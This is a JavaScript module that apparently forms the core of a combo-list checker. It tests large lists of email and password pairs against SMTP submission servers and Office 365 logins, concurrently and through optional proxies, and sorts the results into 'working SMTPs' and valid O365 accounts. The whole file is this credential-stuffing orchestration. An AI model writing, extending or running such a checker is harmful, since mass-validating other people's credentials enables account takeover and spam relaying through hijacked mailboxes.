/**
 * Combined login validation: test every account against BOTH an SMTP login
 * (submission ports 587/465 — never port 25) and the Office 365 checker
 * (IMAP 993 → OAuth 443), in parallel. Each side has its own verdict and its own
 * output file, so one pass sorts a mixed list into working SMTPs and valid O365
 * accounts. No path uses outbound port 25.
 *
 * Network I/O is injected (smtpVerify, resolveMx, verifyOffice365) so the
 * orchestration is unit-testable offline.
 *
 * @typedef {import('./office365.js').O365Target} ComboTarget
 * @typedef {{status:('valid'|'invalid'|'unknown'), host?:string, port?:number, detail?:string}} SmtpVerdict
 * @typedef {{user:string, pass:string, smtp:SmtpVerdict, o365:import('./office365.js').O365Result}} ComboResult
 */
import { candidatesFor, domainOf } from './providers.js';
import { verifyOffice365 } from './office365.js';

/**
 * Confirm an email+password authenticates to its SMTP server on a submission
 * port (587/465 only — port 25 is excluded). Tries the account's authoritative
 * endpoint / MX-derived hosts in order until one authenticates. A reachable
 * server that REFUSES the login is 'invalid'; nothing reachable is 'unknown'.
 * Never a false 'valid' for an open relay — smtp.verify forces real AUTH.
 * @param {ComboTarget} target
 * @param {{smtpVerify:Function, resolveMx?:Function, timeout?:number, maxCandidates?:number, proxy?:any, signal?:AbortSignal}} opts
 * @returns {Promise<SmtpVerdict>}
 */
export async function smtpLoginCheck(target, opts = {}) {
  const cred = { user: String(target?.user || '').trim(), pass: target?.pass ?? '' };
  if (!cred.user || !cred.pass) return { status: 'invalid', detail: 'missing email or password' };
  if (typeof opts.smtpVerify !== 'function') return { status: 'unknown', detail: 'no smtp verifier' };

  let mxHosts = [];
  try { if (opts.resolveMx) mxHosts = (await opts.resolveMx(domainOf(cred.user))) || []; } catch { mxHosts = []; }

  const maxCand = Math.max(1, Number(opts.maxCandidates) || 3);
  const candidates = candidatesFor(cred, { mxHosts, excludePort25: true }).slice(0, maxCand);
  // A short, bounded per-candidate connect timeout: several submission candidates
  // that don't answer (a raw MX on 587, a guessed host) must not add up to a long
  // wall-clock per account. Independent of the O365 timeout.
  const connectTimeout = Math.min(Number(opts.smtpConnectTimeout) || 8000, Number(opts.timeout) || 8000);

  let lastError = '';
  for (const c of candidates) {
    if (opts.signal?.aborted) break;
    let v;
    try { v = await opts.smtpVerify({ ...cred, host: c.host, port: c.port }, { connectTimeout, proxy: opts.proxy }); }
    catch (err) { v = { connected: false, error: err?.message || String(err) }; }
    // A submission server that ANSWERS is the authoritative verdict — stop here.
    // Authenticated -> valid; connected-but-refused -> invalid (real wrong
    // password). Candidates are ordered authoritative-first, so the first host
    // that connects is the right one. Only a host that never connects (timeout /
    // refused) is skipped so the next candidate can be tried.
    if (v.connected && v.authenticated) return { status: 'valid', host: c.host, port: c.port };
    if (v.connected) return { status: 'invalid', host: c.host, port: c.port, detail: v.error || 'auth rejected' };
    lastError = v.error || 'could not connect';
  }
  return { status: 'unknown', detail: lastError || 'no reachable submission server' };
}

/**
 * Run both checks on one account, concurrently. Never throws.
 * @param {ComboTarget} target
 * @param {object} [opts] injected deps + knobs (smtpVerify, resolveMx, verifyOffice365, timeout, …)
 * @returns {Promise<ComboResult>}
 */
export async function verifyCombo(target, opts = {}) {
  const user = String(target?.user || '').trim();
  const pass = target?.pass ?? '';
  const o365Fn = opts.verifyOffice365 || verifyOffice365;
  const [smtp, o365] = await Promise.all([
    smtpLoginCheck({ user, pass }, opts).catch((err) => ({ status: 'unknown', detail: err?.message || String(err) })),
    o365Fn({ user, pass }, opts).catch((err) => ({ user, pass, status: 'unknown', method: '', detail: err?.message || String(err) })),
  ]);
  return { user, pass, smtp, o365 };
}

/**
 * Array runner, bounded concurrency. onResult(result, index) per completion.
 * @param {ComboTarget[]} targets
 * @param {object} [opts]
 * @param {(r:ComboResult, i:number)=>void} [onResult]
 * @returns {Promise<ComboResult[]>}
 */
export async function runComboChecks(targets, opts = {}, onResult) {
  const list = Array.from(targets || []);
  const results = new Array(list.length);
  const concurrency = Math.max(1, Number(opts.concurrency) || 5);
  let next = 0;
  async function worker() {
    while (next < list.length) {
      if (opts.signal?.aborted) return;
      const i = next++;
      if (opts.gate) await opts.gate();
      results[i] = await verifyCombo(list[i], opts);
      onResult?.(results[i], i);
    }
  }
  await Promise.all(Array.from({ length: Math.min(concurrency, list.length) }, worker));
  return results;
}

/**
 * Streaming runner — pulls targets from an async iterable so huge files stream
 * from disk with only `concurrency` accounts in flight.
 * @param {AsyncIterable<ComboTarget>} source
 * @param {object} [opts]
 * @param {(r:ComboResult, i:number)=>void} [onResult]
 * @returns {Promise<number>} number processed
 */
export async function runComboChecksStream(source, opts = {}, onResult) {
  const concurrency = Math.max(1, Number(opts.concurrency) || 5);
  const iterator = source[Symbol.asyncIterator] ? source[Symbol.asyncIterator]() : source;
  let index = 0;
  let exhausted = false;
  let processed = 0;
  async function take() {
    if (exhausted || opts.signal?.aborted) return null;
    const { value, done } = await iterator.next();
    if (done) { exhausted = true; return null; }
    return { value, i: index++ };
  }
  async function worker() {
    for (;;) {
      if (opts.signal?.aborted) return;
      const item = await take();
      if (!item) return;
      if (opts.gate) await opts.gate();
      const r = await verifyCombo(item.value, opts);
      processed++;
      onResult?.(r, item.i);
    }
  }
  await Promise.all(Array.from({ length: concurrency }, worker));
  return processed;
}
